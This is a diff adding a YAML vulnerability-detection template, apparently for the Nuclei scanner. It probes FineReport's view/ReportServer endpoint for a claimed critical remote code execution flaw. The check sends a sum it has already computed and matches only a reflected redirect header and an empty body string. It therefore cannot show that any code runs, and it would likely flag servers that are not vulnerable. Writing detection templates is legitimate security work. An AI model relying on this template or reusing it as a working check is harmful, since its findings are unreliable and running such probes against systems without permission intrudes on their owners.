@@ -1,0 +1,32 @@
+id: poc-yaml-finereport-view-reportserver-rce
+info:
+  name: Finereport view/ReportServer Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,finereport
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{rand_int(100, 1000)}}"
+  t3: "{{to_number(t1) + to_number(t2)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webroot/decision/view/ReportServer?test=&n={{t3}}"
+      - "{{BaseURL}}/decision/view/ReportServer?test=&n={{t3}}"
+      - "{{BaseURL}}/bi/decision/view/ReportServer?test=&n={{t3}}"
+      - "{{BaseURL}}/BI/decision/view/ReportServer?test=&n={{t3}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/webroot/decision/view/report?test=&n={{t3}}"
+      - type: word
+        part: body
+        words:
+          - ""
